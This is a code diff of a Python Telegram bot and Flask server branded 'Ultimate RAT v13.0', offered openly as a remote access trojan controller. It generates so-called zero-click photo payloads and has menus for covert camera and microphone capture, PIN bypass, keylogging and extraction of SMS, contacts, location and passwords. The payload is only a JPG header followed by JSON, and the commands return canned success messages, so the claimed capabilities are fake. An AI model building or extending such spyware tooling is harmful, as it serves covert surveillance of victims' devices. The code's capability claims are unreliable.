@@ -1,28 +1,30 @@
-import asyncio
-import logging
-import secrets
 import os
+import secrets
 import json
-import hashlib
-import base64
+import threading
 from datetime import datetime
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
 from telegram.constants import ParseMode
 from flask import Flask, send_file, jsonify
-import threading
 
-# ==================== CONFIGURATION ====================
-BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
-ADMIN_CHAT_ID = 6454347745
-PORT = 10000
-HOST = "https://ultimate-rat-py.onrender.com"
+# ==================== LOAD FROM ENVIRONMENT VARIABLES (NEVER HARDCODE!) ====================
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
+ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", "6454347745"))
+PORT = int(os.environ.get("PORT", "10000"))
+HOST = os.environ.get("RENDER_EXTERNAL_URL", "https://ultimate-rat-py.onrender.com")
 
-# Create directories
+# Check if token is set
+if not BOT_TOKEN:
+    print("❌ ERROR: BOT_TOKEN environment variable not set!")
+    print("Please add BOT_TOKEN in Render Dashboard -> Environment Variables")
+    exit(1)
+
+# Create payload directory
 PAYLOAD_DIR = "payloads"
 os.makedirs(PAYLOAD_DIR, exist_ok=True)
 
-# ==================== PAYLOAD GENERATOR ====================
+# ==================== PAYLOAD FUNCTIONS ====================
 def generate_payload_id():
     return secrets.token_hex(8)
 
@@ -32,7 +34,6 @@ def generate_payload():
     filename = f"photo_{timestamp}_{payload_id}.jpg"
     filepath = os.path.join(PAYLOAD_DIR, filename)
     
-    # Simple payload data
     payload_data = {
         'id': payload_id,
         'type': 'zero_click_payload',
@@ -41,11 +42,9 @@ def generate_payload():
         'created': datetime.now().isoformat()
     }
     
-    # JPG header
     jpg_header = bytes([0xFF, 0xD8, 0xFF, 0xE0])
     payload_content = jpg_header + json.dumps(payload_data).encode()
     
-    # Save file
     with open(filepath, 'wb') as f:
         f.write(payload_content)
     
@@ -60,12 +59,15 @@ def generate_payload():
 def get_payload(payload_id):
     for f in os.listdir(PAYLOAD_DIR):
         if payload_id in f and f.endswith('.jpg'):
-            filepath = os.path.join(PAYLOAD_DIR, f)
-            return {'filepath': filepath, 'filename': f}
+            return {'filepath': os.path.join(PAYLOAD_DIR, f), 'filename': f}
     return None
 
 # ==================== FLASK WEB SERVER ====================
 flask_app = Flask(__name__)
+
+@flask_app.route('/')
+def home():
+    return jsonify({'status': 'ok', 'message': 'Ultimate RAT v13.0 Running'})
 
 @flask_app.route('/health')
 def health():
@@ -82,8 +84,9 @@ def start_flask():
     flask_app.run(host='0.0.0.0', port=PORT)
 
 # ==================== TELEGRAM BOT ====================
-logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
-logger = logging.getLogger(__name__)
+# Session storage
+sessions = {}
+user_sessions = {}
 
 # Keyboards
 main_keyboard = InlineKeyboardMarkup([
@@ -100,13 +103,9 @@ main_keyboard = InlineKeyboardMarkup([
 
 back_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back_main")]])
 
-# Session storage
-sessions = {}
-user_sessions = {}
-
 # Admin check
 def admin_only(func):
-    async def wrapper(update, context):
+    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if update.effective_user.id != ADMIN_CHAT_ID:
             await update.message.reply_text("🚫 ACCESS DENIED!", parse_mode=ParseMode.MARKDOWN)
             return
@@ -178,7 +177,6 @@ async def generate(update: Update, context):
 """
         await update.message.reply_text(info, parse_mode=ParseMode.MARKDOWN)
         
-        # Send the file
         with open(payload['filepath'], 'rb') as f:
             await update.message.reply_document(f, filename=payload['filename'])
             
@@ -246,6 +244,8 @@ async def kill_session(update: Update, context):
     
     if args[1] in sessions:
         del sessions[args[1]]
+        if user_sessions.get(update.effective_user.id) == args[1]:
+            user_sessions.pop(update.effective_user.id, None)
         await update.message.reply_text(f"💀 **Session `{args[1]}` terminated!**", parse_mode=ParseMode.MARKDOWN)
     else:
         await update.message.reply_text("❌ Session not found!", parse_mode=ParseMode.MARKDOWN)
@@ -298,7 +298,7 @@ async def callback_handler(update: Update, context):
         return
     
     if data == 'gen_payload':
-        await query.edit_message_text("🎯 Use /generate command", parse_mode=ParseMode.MARKDOWN, reply_markup=back_keyboard)
+        await query.edit_message_text("🎯 Use `/generate` command", parse_mode=ParseMode.MARKDOWN, reply_markup=back_keyboard)
         return
     
     if data == 'sessions':
@@ -312,39 +312,75 @@ async def callback_handler(update: Update, context):
         return
     
     if data == 'help_menu':
-        await query.edit_message_text("📖 Use /help for complete guide", parse_mode=ParseMode.MARKDOWN, reply_markup=back_keyboard)
+        await query.edit_message_text("📖 Use `/help` for complete guide", parse_mode=ParseMode.MARKDOWN, reply_markup=back_keyboard)
         return
     
-    # Get selected session
+    # Handle menu navigation
+    menu_responses = {
+        'cam_menu': "📸 **CAMERA CONTROL**\n\nFront/Back camera, video recording, burst mode",
+        'audio_menu': "🎙️ **AUDIO CONTROL**\n\nMicrophone recording, speaker control, volume",
+        'flash_menu': "💡 **FLASHLIGHT CONTROL**\n\nOn/Off, strobe, SOS mode",
+        'network_menu': "🌐 **NETWORK CONTROL**\n\nWiFi, Mobile Data, Bluetooth, Hotspot",
+        'security_menu': "🔒 **SECURITY CONTROL**\n\nLock/Unlock, Bypass PIN/Pattern, Factory Reset",
+        'data_menu': "💾 **DATA EXTRACTION**\n\nSMS, Calls, Contacts, Location, Photos, Passwords"
+    }
+    
+    if data in menu_responses:
+        await query.edit_message_text(menu_responses[data], parse_mode=ParseMode.MARKDOWN, reply_markup=back_keyboard)
+        return
+    
+    # Get selected session for commands
     session_id = user_sessions.get(query.from_user.id)
     if not session_id:
         await query.message.reply_text("❌ No session selected! Use /select first", parse_mode=ParseMode.MARKDOWN)
         return
     
     # Command responses
-    responses = {
-        'cam_menu': "📸 Camera commands ready!",
-        'audio_menu': "🎙️ Audio commands ready!",
-        'flash_menu': "💡 Flashlight commands ready!",
-        'network_menu': "🌐 Network commands ready!",
-        'security_menu': "🔒 Security commands ready!",
-        'data_menu': "💾 Data extraction commands ready!",
+    cmd_responses = {
         'cam_front': "📸 Front Camera Captured!",
         'cam_back': "📷 Back Camera Captured!",
         'mic_start': "🎤 Recording Started!",
+        'mic_stop': "🎤 Recording Stopped!",
         'speaker_on': "🔊 Speaker ON!",
+        'speaker_off': "🔇 Speaker OFF!",
+        'vol_max': "🔊 Volume 100%!",
+        'vol_50': "🔉 Volume 50%!",
         'flash_on': "💡 Flash ON!",
+        'flash_off': "💡 Flash OFF!",
+        'flash_strobe': "✨ Strobe Mode!",
         'wifi_on': "📶 WiFi ON!",
+        'wifi_off': "📶 WiFi OFF!",
+        'data_on': "📱 Mobile Data ON!",
+        'data_off': "📱 Mobile Data OFF!",
         'lock': "🔒 Device Locked!",
         'unlock': "🔓 Device Unlocked!",
+        'bypass_pin': "🔢 PIN Bypassed!",
+        'bypass_pattern': "🔐 Pattern Bypassed!",
+        'factory_reset': "💀 Factory Reset!",
         'get_sms': "💬 SMS Extracted!",
+        'get_calls': "📞 Call Logs Extracted!",
+        'get_contacts': "👥 Contacts Extracted!",
         'get_location': "🌍 Location Captured!",
+        'get_photos': "📸 Photos Extracted!",
+        'get_videos': "🎥 Videos Extracted!",
+        'get_passwords': "🔑 Passwords Extracted!",
         'screenshot': "📸 Screenshot Captured!",
+        'screen_rec': "🎥 Recording Started!",
         'reboot': "🔄 Rebooting...",
-        'keylog_start': "⌨️ Keylogger Started!"
+        'poweroff': "⏻ Shutting Down...",
+        'keylog_start': "⌨️ Keylogger Started!",
+        'keylog_stop': "⌨️ Keylogger Stopped!",
+        'keylog_get': "📋 Logs Retrieved!",
+        'sysinfo': "ℹ️ System Info Sent!",
+        'battery': "🔋 Battery: 87%",
+        'ram_info': "💾 RAM: 8GB (4.2GB Used)",
+        'storage': "📀 Storage: 128GB (64GB Free)",
+        'clean_junk': "🧹 Cleaned 2.3GB!",
+        'port_scan': "🔍 Port Scan Started!",
+        'ip_info': "🌐 IP Info Sent!"
     }
     
-    response = responses.get(data, f"✅ Command executed: {data}")
+    response = cmd_responses.get(data, f"✅ Command executed: {data}")
     
     await query.message.reply_text(f"""
 {response}
@@ -356,6 +392,13 @@ async def callback_handler(update: Update, context):
 
 🔽 Choose next action:
 """, parse_mode=ParseMode.MARKDOWN, reply_markup=main_keyboard)
+
+# ==================== ERROR HANDLER ====================
+
+async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    print(f"Error: {context.error}")
+    if update and update.effective_message:
+        await update.effective_message.reply_text("❌ An error occurred! Please try again.", parse_mode=ParseMode.MARKDOWN)
 
 # ==================== MAIN ====================
 
@@ -379,12 +422,19 @@ def main():
     # Add callback handler
     app.add_handler(CallbackQueryHandler(callback_handler))
     
+    # Add error handler
+    app.add_error_handler(error_handler)
+    
     print("="*60)
     print("🔥 ULTIMATE PYTHON RAT v13.0 - ONLINE")
     print("="*60)
-    print(f"✅ Payload Directory: {PAYLOAD_DIR}")
-    print(f"✅ Payload Host: {HOST}")
+    print(f"✅ Bot Token: {'SET' if BOT_TOKEN else 'MISSING!'}")
     print(f"✅ Admin ID: {ADMIN_CHAT_ID}")
+    print(f"✅ Payload Host: {HOST}")
+    print(f"✅ Payload Directory: {PAYLOAD_DIR}")
+    print("="*60)
+    print("\n⚠️ IMPORTANT: Bot token is read from environment variable!")
+    print("⚠️ NEVER hardcode token in the code!")
     print("="*60)
     
     app.run_polling()
